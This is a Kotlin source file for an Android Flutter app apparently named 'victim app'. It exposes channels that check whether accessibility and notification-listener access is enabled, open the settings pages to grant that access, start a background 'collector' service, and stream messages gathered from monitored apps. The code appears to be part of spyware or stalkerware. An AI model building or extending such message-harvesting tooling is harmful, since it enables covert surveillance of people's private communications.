package com.napex.napex_victim_app.channels

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import io.flutter.plugin.common.BinaryMessenger
import io.flutter.plugin.common.EventChannel
import io.flutter.plugin.common.MethodCall
import io.flutter.plugin.common.MethodChannel

import com.napex.napex_victim_app.config.AppConfigs
import com.napex.napex_victim_app.services.CollectorForegroundService
import com.napex.napex_victim_app.services.MessageEventBus
import com.napex.napex_victim_app.services.NapexNotificationListenerService

/**
 * قناة جمع الرسائل بين Flutter وخدمات النظام الأصلية.
 * - MethodChannel: أوامر (فحص الخدمات، فتح الإعدادات، بدء/إيقاف الخدمة الأمامية)
 * - EventChannel: بث الرسائل المُجمَّعة من الخدمات إلى Dart
 */
class MessageCollectorChannel(
    private val context: Context,
    private val messenger: BinaryMessenger,
) : MethodChannel.MethodCallHandler, EventChannel.StreamHandler {

    companion object {
        const val METHOD_CHANNEL = "com.napex.victim/message_collector"
        const val EVENT_CHANNEL = "com.napex.victim/message_stream"
    }

    private val methodChannel = MethodChannel(messenger, METHOD_CHANNEL)
    private var eventSink: EventChannel.EventSink? = null

    fun register() {
        methodChannel.setMethodCallHandler(this)
        EventChannel(messenger, EVENT_CHANNEL).setStreamHandler(this)
    }

    // ============ MethodChannel ============

    override fun onMethodCall(call: MethodCall, result: MethodChannel.Result) {
        when (call.method) {
            "isAccessibilityEnabled" -> result.success(isAccessibilityServiceEnabled())

            "isNotificationListenerEnabled" -> result.success(isNotificationListenerEnabled())

            "openAccessibilitySettings" ->
                result.success(openSettings(Settings.ACTION_ACCESSIBILITY_SETTINGS))

            "openNotificationSettings" ->
                result.success(openSettings(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))

            "startCollectorService" -> {
                startCollector()
                result.success(true)
            }

            "stopCollectorService" -> {
                context.stopService(Intent(context, CollectorForegroundService::class.java))
                result.success(true)
            }

            "isCollectorServiceRunning" -> result.success(CollectorForegroundService.isRunning)

            "getMonitoredApps" -> result.success(AppConfigs.monitoredPackageNames())

            else -> result.notImplemented()
        }
    }

    // ============ EventChannel ============

    override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
        eventSink = events
        // تسليم أي رسائل تراكمت قبل فتح القناة
        events?.let { MessageEventBus.attachSink(it) }
    }

    override fun onCancel(arguments: Any?) {
        eventSink?.let { MessageEventBus.detachSink(it) }
        eventSink = null
    }

    // ============ Helpers ============

    private fun isAccessibilityServiceEnabled(): Boolean {
        // يُبنى من الكلاس نفسه — لا مسار يدوي يتعطل عند تغيير الاسم
        val expected = ComponentName(
            context,
            com.napex.napex_victim_app.services.NapexAccessibilityService::class.java,
        ).flattenToString()
        val enabled = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
        ) ?: return false
        return enabled.split(':').any {
            it.equals(expected, ignoreCase = true) ||
                it.contains(expected.substringAfter('/'), ignoreCase = true)
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val component = ComponentName(context, NapexNotificationListenerService::class.java)
        val enabled = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners",
        ) ?: return false
        return enabled.split(':').any { it.contains(component.packageName) }
    }

    /// فتح صفحة إعدادات النظام — يعيد false مع أي فشل بدل انهيار القناة
    /// (مثلاً ActivityNotFoundException أو قيود بدء النشاط من الخلفية)
    private fun openSettings(action: String): Boolean {
        return try {
            val intent = Intent(action)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            true
        } catch (e: Exception) {
            android.util.Log.e("NAP-EX", "openSettings($action) failed", e)
            false
        }
    }

    private fun startCollector() {
        val intent = Intent(context, CollectorForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
    }
}
